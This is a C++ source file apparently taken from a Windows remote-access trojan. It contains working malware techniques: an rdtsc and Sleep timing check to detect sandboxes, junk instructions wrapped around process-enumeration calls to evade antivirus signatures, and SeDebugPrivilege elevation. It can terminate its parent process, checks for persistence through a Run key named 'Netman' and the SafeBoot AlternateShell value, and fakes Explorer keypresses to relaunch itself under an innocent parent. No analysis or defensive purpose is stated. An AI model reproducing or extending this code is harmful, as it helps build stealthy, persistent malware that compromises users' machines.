#include "StdAfx.h"
#include "tchar.h"
#pragma comment(lib,"WS2_32.LIB")
#pragma comment(lib, "rasapi32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "imagehlp.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Imm32.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "shlwapi.lib")



#ifdef _VS200XBUILD

extern "C" EXCEPTION_DISPOSITION __cdecl _except_handler3();
extern "C" DWORD __stdcall _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);


DWORD __declspec(naked) Entry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    //char szSelfFile[MAX_PATH];
    //HANDLE hFile;


    __asm
    {
        push ebp;
        mov ebp, esp;
        sub esp, __LOCAL_SIZE;
    }

    __asm
    {
        push eax;
        push edx;
        rdtsc;
        push edx;
        push 2000;
        mov eax, Sleep;
        call eax;
        rdtsc;
        pop eax;
        cmp eax, edx;
        jz DEAD;
        pop edx;
        pop eax;
    }

    _DllMainCRTStartup(hinstDLL, fdwReason, lpReserved);

    __asm
    {
        push eax;
    }

    //CloseHandle(hFile);

    __asm
    {
        pop eax;
        pop ebp;
        ret;
    }

    __asm
    {
DEAD:
        pop eax;
        test eax, eax;
        jnz DEAD;
        ret;
    }
}

extern "C" EXCEPTION_DISPOSITION __declspec(naked) __cdecl Unused__CxxFrameHandler3()
{    
    __asm
    {
        jmp _except_handler3;
    }
}

#endif	//_VS200XBUILD

BOOL
__declspec(naked)
WINAPI
MyProcess32First(
                 HANDLE hSnapshot,
                 LPPROCESSENTRY32 lppe
                 )
{
	__asm
	{
		push eax;
		nop;
		pop eax;
		xchg ah,al;
		xchg al,ah;
	}

    GetProcAddress(GetModuleHandle("kernel32.dll"), "Process32First");
    __asm jmp eax;
}

BOOL
__declspec(naked)
WINAPI
MyProcess32Next(
                HANDLE hSnapshot,
                LPPROCESSENTRY32 lppe
                )
{
	__asm
	{
		push eax;
		nop;
		pop eax;
		xchg ah,al;
		xchg al,ah;
	}

    GetProcAddress(GetModuleHandle("kernel32.dll"), "Process32Next");
    __asm jmp eax;
}

// BOOL CALLBACK GetWndByWndArgs(HWND hWnd, LPARAM lParam)
// {
// 	DWORD dwProcessId = 0;
// 	TCHAR szDesWndText[MAX_PATH]={0};
// 	//TCHAR szSrcWndText[MAX_PATH]={0};
// 	TCHAR szDesWndClassName[MAX_PATH]={0};
// 	//TCHAR szSrcWndClassName[MAX_PATH]={0};
// 
// 	GetWindowThreadProcessId(hWnd, &dwProcessId);
// 
// 	pEMNUARGS pEmnuArgs=(pEMNUARGS)lParam;
// 
// 	if (pEmnuArgs->dwWndProcessID&&dwProcessId!=pEmnuArgs->dwWndProcessID)
// 	{
// 		return TRUE;
// 	}
// 
// 	GetWindowText(hWnd,szDesWndText,MAX_PATH);
// 	GetClassName(hWnd,szDesWndClassName,MAX_PATH);
// 
// 
// 	if (pEmnuArgs->szWndText)
// 	{
// 		if(!_tcsicmp(szDesWndText,pEmnuArgs->szWndText))	pEmnuArgs->hWnd=hWnd;
// 		else pEmnuArgs->hWnd=0;
// 	}
// 
// 	if (pEmnuArgs->szWndClassName)
// 	{
// 		if(!_tcsicmp(szDesWndClassName,pEmnuArgs->szWndClassName))	pEmnuArgs->hWnd=hWnd;	
// 		else pEmnuArgs->hWnd=0;
// 	}
// 
// 	//找到句柄后停止枚举
// 	if (pEmnuArgs->hWnd)
// 	{
// 		return FALSE;
// 	}
// 	return TRUE;
// }



void PostEnterKey(HWND hWnd)
{
	SetForegroundWindow(hWnd);
	SetActiveWindow(hWnd);

	keybd_event(VK_RETURN,0,0,0);
	keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP,0);
	//keybd_event(VK_DOWN,0,WM_KEYDOWN,0);
	//keybd_event(VK_DOWN,0,WM_KEYUP,0);
// 	keybd_event(VK_RETURN,0,WM_KEYDOWN,0);
// 	keybd_event(VK_RETURN,0,WM_KEYUP,0);
}


//模拟双击程序
BOOL Exlplorer_Select(TCHAR *szRunExePath,WORD wShow)
{

	PROCESS_INFORMATION ProcessInformation={0};

	STARTUPINFO StartupInfo={0};

	//_tmemset(&StartupInfo,0,sizeof(STARTUPINFO));
	StartupInfo.cb=sizeof(StartupInfo);
	StartupInfo.dwFlags =STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow =wShow;


	int  dwNum = 0;

	TCHAR* szTempBuf[MAX_PATH*2]={0};

	_tcsncpy((TCHAR*)szTempBuf,(TCHAR*)szRunExePath,MAX_PATH*2);

	for (dwNum=0;dwNum<10;dwNum++)
	{
		if (CreateProcess(0,(LPTSTR)szTempBuf, 0, 0, 0, 0, 0, 0, &StartupInfo,&ProcessInformation))
		{
			//Sleep(1000);
			return TRUE;
		}
	}
	return FALSE;

}

BOOL FindRegValue(HKEY hRootKey ,LPSTR szSubKey,LPSTR szQueryKey,LPSTR lpszFileName)
{
	BOOL bRet=FALSE;

	HKEY hKey;
	do
	{
		if (RegOpenKeyExA(hRootKey,szSubKey,0,KEY_QUERY_VALUE,&hKey)!=ERROR_SUCCESS)
		{
			break;
		}

		CHAR strTemp[MAX_PATH];
		DWORD dwSize=MAX_PATH;
		DWORD dwType=0;

		RegQueryValueExA(hKey,szQueryKey,0,&dwType,(LPBYTE)strTemp, &dwSize);
		//OutputDebugStringA(strTemp);
		RegCloseKey(hKey);
		if (strstr(strTemp,lpszFileName))
		{
			bRet=TRUE;
		}
	}while(FALSE);

	return bRet;
}

BOOL My_WinExec(TCHAR *szFileName)
{

	BOOL bRet=0;
	WORD wShowWindow=1;

	TCHAR szCmd[MAX_PATH];
	wsprintf(szCmd,"explorer.exe /select, %s",szFileName);


// 	if (!Exlplorer_Select(szCmd,0)){
// 		return bRet;
// 	}

	//TCHAR szFilePath[MAX_PATH]={0};

	CHAR szLongPath[MAX_PATH] = {0};
	GetLongPathNameA(szFileName, szLongPath,MAX_PATH);

	if (0 != lstrlenA(szLongPath)){
		*(StrRChr(szLongPath,NULL,'\\'))=0;
	}	


	TCHAR szShort[MAX_PATH];
	StrCpyA(szShort,StrRChr(szLongPath,NULL,'\\')+1);

	CHAR szTempPath[MAX_PATH] = {0};
	GetShortPathNameA(szLongPath, szTempPath, MAX_PATH);



	//SetWindowText(hWnd,"fdsf@#");


	// 	PostMessage(hWnd,WM_CLOSE,0,0);



	//HANDLE hEvent;
	//wShowWindow=0;
	HWND hWnd;
	do 
	{
		if (IsRegExsit())
		{
			break;
		}
// 		if (FindRegValue(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run","Netman","ctfmon.exe"))
// 		{
// 			break;
// 
// 		}

		Exlplorer_Select(szCmd,0);

		hWnd=0;
		
		hWnd=FindWindow(0,szLongPath);

		if (!hWnd)
		{
			hWnd=FindWindow(0,szShort);
		}
		if (!hWnd)
		{
			hWnd=FindWindow(0,szTempPath);

		}
		if (!hWnd)
		{
			continue;
		}

		PostEnterKey(hWnd);
		Sleep(100);
		PostMessage(hWnd,WM_CLOSE,0,0);

	} while (1);

	PostMessage(hWnd,WM_CLOSE,0,0);
	//ExitProcess(0);
	return bRet;
}


BOOL EnableDebugPriv_STDAFX(void)
{
	HANDLE hToken = NULL;
	HANDLE Handle = ::GetCurrentProcess();
	if (!::OpenProcessToken(Handle,TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken))
	{
		return FALSE;
	}

	LUID sedebugnameValue = {0};
	if (!::LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&sedebugnameValue))
	{
		::CloseHandle(hToken);
		return FALSE;
	}

	TOKEN_PRIVILEGES tkp = {0};
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!::AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		::CloseHandle(hToken);
		return FALSE;
	}

	::CloseHandle(hToken);

	return TRUE;
}

BOOL GetParentProcessPath(TCHAR *szSelfName,OUT CHAR *szFilePath,BOOL IsTerminate)
{


	//提升权限
	EnableDebugPriv_STDAFX();

	typedef struct
	{
		DWORD ExitStatus; // 接收进程终止状态
		DWORD PebBaseAddress; // 接收进程环境块地址
		DWORD AffinityMask; // 接收进程关联掩码
		DWORD BasePriority; // 接收进程的优先级类
		ULONG UniqueProcessId; // 接收进程ID
		ULONG InheritedFromUniqueProcessId; //接收父进程ID
	} PROCESS_BASIC_INFORMATION;

	typedef int(WINAPI *pNtQueryInformationProcess)(HANDLE,DWORD,PVOID,ULONG,PULONG);//暂时用int代替
	pNtQueryInformationProcess NtQueryInformationProcess;
	HINSTANCE hdll=LoadLibrary("Ntdll.dll");
	NtQueryInformationProcess=(pNtQueryInformationProcess)GetProcAddress(hdll,"NtQueryInformationProcess");

	HANDLE hCurProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	DWORD dwParentID=0;
	if (hCurProcess != NULL)
	{
		PROCESS_BASIC_INFORMATION pbi;
		NtQueryInformationProcess(hCurProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION),0);
		dwParentID=pbi.InheritedFromUniqueProcessId;

	}

	CloseHandle(hCurProcess);


	HANDLE hProcess =OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwParentID);
	if (hProcess)
	{
		GetModuleFileNameEx(hProcess,0,szFilePath,MAX_PATH);
		if (IsTerminate)
		{
			TerminateProcess(hProcess,0);
		}
		CloseHandle(hProcess);

	}


	return FALSE;

}

BOOL IsRegExsit()
{

	CHAR *szPath="ctfmon.exe";
	if (FindRegValue(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\option","AlternateShell",szPath))
	{
		return TRUE;
	}

	if (FindRegValue(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run","Netman",szPath))
	{
		return TRUE;

	}
	return FALSE;

}

BOOL IsExplorerParentProcess()
{
	char	strFileName[MAX_PATH];
	GetModuleFileName( 0, strFileName, sizeof(strFileName));
	char szParentPath[MAX_PATH]={0};
	GetParentProcessPath(strFileName,szParentPath,0);
 	if (StrStrI(szParentPath,"explorer.exe")||
 		StrStrI(szParentPath,"svchost.exe")
		)
// 	if (strlen(szParentPath)==0||
// 		StrStrI(szParentPath,"\\windows\\")||
// 		StrStrI(szParentPath,"\\system32\\")
// 		)

	{
		return TRUE;
	}
	return FALSE;
}

void PrintString(TCHAR *tszStr,...)
{
	TCHAR szFormat[MAX_PATH*2] = {0};

	va_list argList;
	va_start(argList,tszStr);
	_vsntprintf(szFormat, MAX_PATH*2-1,tszStr, argList );
	va_end(argList);
	OutputDebugString(szFormat);
}